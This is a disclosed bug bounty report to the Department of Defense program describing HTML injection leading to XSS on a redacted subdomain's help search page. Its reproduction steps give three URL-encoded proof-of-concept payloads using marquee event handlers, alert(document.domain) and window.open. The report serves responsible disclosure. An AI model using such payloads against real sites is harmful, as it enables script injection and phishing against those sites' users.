# HTML Injection leads to XSS on███

## Report Details
- **Report ID**: 874228
- **URL**: https://hackerone.com/reports/874228
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-05-14T13:22:43.123Z
- **Disclosed**: 2020-07-30T17:46:24.596Z

## Reporter
- **Username**: lemonoftroy
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: deptofdefense

## Vulnerability Information
###Hello Team!

###I just found a HTML injection in subdomain████ that leads XSS with several payloads, let me show you the POC.

##POC 1 (Firefox 76)

█████

---

##POC 2 (Chrome 81)

███████

---


## Impact
An attacker could use the domain to trick users to execute malicious javascript code.

## Step-by-step Reproduction Instructions

* 1. Write the following URL :  

```
https://███/help-leave/help/index.htm#rhsearch=%3Cmarquee%20loop=1%20onfinish=alert(document.domain)%3Etest%3C%2Fmarquee%3E&ux=search
```

* 2. With this payload you can inject links :

```
https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Cu%3E%3Ca%20href%3D%22http%3A%2F%2Fwww.google.com%22%20onmouseover%3Dalert(document.domain)%3EXSS%20HACKERONE%20%2F%20lemonoftroy%3C%2Fa%3E%3C%2Fmarquee%3E&ux=search
```
* 3. With this payload you can open a window:

```
https://█████/help-leave/help/index.htm#rhsearch=%3Cmarquee%3E%3Ca%20href=%22http://google.com%22%20onmouseover=window.open(%22https://www.google.com%22)%3Etest%20for%20hackerone%3C/marquee%3E&ux=search
```




##Browsers Verified In:
Firefox 76 / Chrome 81




Let me know if you can't reproduce the issue:

Regards

## Impact

XSS, Open Redirect.

## Attachments
No attachments
